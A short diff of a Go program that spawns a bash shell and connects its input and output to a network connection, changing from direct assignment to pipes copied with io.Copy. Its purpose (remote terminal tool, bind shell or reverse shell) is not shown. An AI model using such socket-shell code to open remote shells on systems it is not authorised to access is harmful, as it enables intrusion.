@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -62,9 +63,23 @@ func main() {
 				"TERM=xterm-256color",
 				"SHELL=/bin/bash",
 			}
-			cmd.Stdin = conn
-			cmd.Stdout = conn
-			cmd.Stderr = conn
+
+			stdin, err := cmd.StdinPipe()
+			if err != nil {
+				conn.Write([]byte(fmt.Sprintf("Failed to create pipe to stdin: %s", err)))
+			}
+			stdout, err := cmd.StdoutPipe()
+			if err != nil {
+				conn.Write([]byte(fmt.Sprintf("Failed to create pipe to stdout: %s", err)))
+			}
+			stderr, err := cmd.StderrPipe()
+			if err != nil {
+				conn.Write([]byte(fmt.Sprintf("Failed to create pipe to stderr: %s", err)))
+			}
+
+			go io.Copy(stdin, conn)
+			go io.Copy(conn, stdout)
+			go io.Copy(conn, stderr)
 
 			if err = cmd.Run(); err != nil {
 				conn.Write([]byte(fmt.Sprintf("Failed to start shell: %s", err)))
